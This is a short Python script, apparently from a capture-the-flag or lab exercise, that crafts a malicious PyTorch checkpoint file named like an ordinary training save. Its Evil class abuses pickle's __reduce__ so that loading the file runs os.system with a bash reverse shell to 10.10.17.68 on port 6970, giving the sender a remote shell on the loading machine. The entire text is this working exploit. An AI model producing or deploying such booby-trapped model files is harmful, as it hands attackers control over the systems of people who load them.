import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "bash -i >& /dev/tcp/10.10.17.68/6970 0>&1"',))
torch.save({"model": Evil()}, "checkpoint_epoch_999.pt")
